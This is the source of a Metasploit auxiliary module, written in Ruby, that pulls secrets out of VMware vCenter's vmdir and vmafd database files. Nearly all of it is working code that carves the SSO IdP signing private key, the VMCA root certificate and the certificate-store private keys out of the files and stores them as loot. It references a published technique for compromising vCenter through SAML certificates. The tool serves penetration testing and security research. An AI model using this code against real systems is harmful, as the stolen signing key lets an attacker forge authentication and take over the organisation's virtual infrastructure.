##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Extract Secrets from vmdir / vmafd DB File',
        'Description' => %q{
          Grab certificates from the vCenter server vmdird and vmafd
          database files and adds them to loot. The vmdird MDB database file
          can be found on the live appliance under the path
          /storage/db/vmware-vmdir/data.mdb, and the DB vmafd is under path
          /storage/db/vmware-vmafd/afd.db. The vmdir database contains the
          IdP signing credential, and vmafd contains the vCenter certificate
          store. This module will accept either file from a live vCenter
          appliance, or from a vCenter appliance backup archive; either or
          both files can be supplied.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'linux' ],
        'DisclosureDate' => '2022-05-10',
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/']
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump secrets from vCenter files'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptPath.new('VMDIR_MDB', [ false, 'Path to the vmdir data.mdb file' ]),
      OptPath.new('VMAFD_DB', [ false, 'Path to the vmafd afd.db file' ]),
      OptString.new('VC_IP', [ false, '(Optional) IPv4 address to attach to loot' ])
    ])

    register_advanced_options([
      OptInt.new('MDB_CHUNK_SIZE', [ true, 'Block size to use when scanning MDB file', 4096 ]),
      OptInt.new('MDB_STARTING_OFFSET', [ true, 'Starting offset for MDB file binary scan', 0 ])
    ])
  end

  def loot_host
    datastore['VC_IP'] || '127.0.0.1'
  end

  def vmdir_file
    datastore['VMDIR_MDB']
  end

  def vmafd_file
    datastore['VMAFD_DB']
  end

  def run
    unless vmdir_file || vmafd_file
      print_error('Please specify the path to at least one vCenter database file (VMDIR_MDB or VMAFD_DB)')
      return
    end
    if vmdir_file
      print_status("Extracting vmwSTSTenantCredential from #{vmdir_file} ...")
      extract_idp_cert
    end
    if vmafd_file
      print_status("Extracting vSphere platform certificates from #{vmafd_file} ...")
      extract_vmafd_certs
    end
  end

  def extract_vmafd_certs
    db = SQLite3::Database.open(vmafd_file)
    db.results_as_hash = true
    unless (vecs_entry_alias = db.execute('SELECT DISTINCT Alias FROM CertTable WHERE PrivateKey NOT NULL;'))
      fail_with(Msf::Exploit::Failure::NoTarget, 'Empty Alias list returned from CertTable')
    end
    vecs_entry_alias.each do |vecs_alias|
      store_label = vecs_alias['Alias'].upcase
      unless (res = db.execute("SELECT PrivateKey, CertBlob FROM CertTable WHERE Alias = '#{store_label}';").first)
        fail_with(Msf::Exploit::Failure::NoTarget, "Could not extract CertTable Alias '#{store_label}'")
      end
      priv_pem = res['PrivateKey'].encode('utf-8').delete("\000")
      pub_pem = res['CertBlob'].encode('utf-8').delete("\000")
      begin
        key = OpenSSL::PKey::RSA.new(priv_pem)
        cert = OpenSSL::X509::Certificate.new(pub_pem)
        p = store_loot(store_label, 'PEM', loot_host, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
        print_good("#{store_label} key: #{p}")
        p = store_loot(store_label, 'PEM', loot_host, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
        print_good("#{store_label} cert: #{p}")
      rescue OpenSSL::PKey::PKeyError
        print_error("Could not extract #{store_label} private key")
      rescue OpenSSL::X509::CertificateError
        print_error("Could not extract #{store_label} certificate")
      end
    end
  rescue SQLite3::NotADatabaseException => e
    fail_with(Msf::Exploit::Failure::NoTarget, "Error opening SQLite3 database '#{vmafd_file}': #{e.message}")
  rescue SQLite3::SQLException => e
    fail_with(Msf::Exploit::Failure::NoTarget, "Error calling SQLite3: #{e.message}")
  end

  def extract_idp_cert
    sts_pem = nil
    unless (bytes = read_mdb_sts_block(vmdir_file, datastore['MDB_CHUNK_SIZE'], datastore['MDB_STARTING_OFFSET']))
      fail_with(Msf::Exploit::Failure::NoTarget, "Invalid vmdird database '#{vmdir_file}': unable to locate TenantCredential-1 in binary stream")
    end
    idp_key = get_sts_key(bytes)
    idp_key_pem = idp_key.to_pem.to_s
    get_sts_pem(bytes).each do |stscert|
      idp_cert_pem = stscert.to_pem.to_s
      case stscert.check_private_key(idp_key)
      when true # Private key associates with public cert
        sts_pem = "#{idp_key_pem}#{idp_cert_pem}"
        p = store_loot('idp', 'PEM', loot_host, idp_key_pem, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
        print_good("SSO_STS_IDP key: #{p}")
        p = store_loot('idp', 'PEM', loot_host, idp_cert_pem, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
        print_good("SSO_STS_IDP cert: #{p}")
      when false # Private key does not associate with this cert (VMCA root)
        p = store_loot('vmca', 'PEM', loot_host, idp_cert_pem, 'VMCA_ROOT.pem', 'vCenter VMCA root certificate')
        print_good("VMCA_ROOT cert: #{p}")
      end
    end
    unless sts_pem # We were unable to link a public and private key together
      fail_with(Msf::Exploit::Failure::NoTarget, 'Unable to associate IdP certificate and private key')
    end
  end

  def read_mdb_sts_block(file_name, chunk_size, offset)
    bytes = nil
    file = File.open(file_name, 'rb')
    while offset <= file.size - chunk_size
      buf = File.binread(file, chunk_size, offset + 1)
      if buf.match?(/cn=tenantcredential-1/i) && buf.match?(/[\x30\x82](.{2})[\x30\x82]/n) && buf.match?(/[\x30\x82](.{2})[\x02\x01\x00]/n)
        target_offset = offset + buf.index(/cn=tenantcredential-1/i) + 1
        bytes = File.binread(file, chunk_size * 2, target_offset)
        break
      end
      offset += chunk_size
    end
    bytes
  rescue StandardError => e
    fail_with(Msf::Exploit::Failure::Unknown, "Exception in #{__method__}: #{e.message}")
  ensure
    file.close
  end

  def read_der(bytes)
    der_len = (bytes[2..3].unpack('H*').first.to_i(16) + 4).to_i
    unless der_len <= bytes.length - 1
      fail_with(Msf::Exploit::Failure::Unknown, 'Malformed DER: byte length exceeds working buffer size')
    end
    bytes[0..der_len - 1]
  end

  def get_sts_key(bytes)
    working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}020100/) / 2 # PKCS1 magic bytes
    byte_len = bytes.length - working_offset
    key_bytes = read_der(bytes[working_offset, byte_len])
    key_b64 = Base64.strict_encode64(key_bytes).scan(/.{1,64}/).join("\n")
    key_pem = "-----BEGIN PRIVATE KEY-----\n#{key_b64}\n-----END PRIVATE KEY-----"
    vprint_status("key_pem:\n#{key_pem}")
    OpenSSL::PKey::RSA.new(key_pem)
  rescue OpenSSL::PKey::PKeyError
    # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of PKCS#1 RSA private key')
    print_error('Failure during extract of PKCS#1 RSA private key')
  end

  def get_sts_pem(bytes)
    idp_certs = []
    working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}3082/) / 2 # x509v3 magic bytes
    byte_len = bytes.length - working_offset
    working_bytes = bytes[working_offset, byte_len]
    [4, 8].each do |offset|
      der_bytes = read_der(working_bytes)
      der_b64 = Base64.strict_encode64(der_bytes).scan(/.{1,64}/).join("\n")
      der_pem = "-----BEGIN CERTIFICATE-----\n#{der_b64}\n-----END CERTIFICATE-----"
      vprint_status("der_pem:\n#{der_pem}")
      idp_certs << OpenSSL::X509::Certificate.new(der_pem)
      next_offset = working_offset + der_bytes.length + offset - 1
      working_offset = next_offset
      byte_len = bytes.length - working_offset
      working_bytes = bytes[working_offset, byte_len]
    end
    idp_certs
  rescue OpenSSL::X509::CertificateError
    # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of x509v3 certificate')
    print_error('Failure during extract of x509v3 certificate')
  end
end
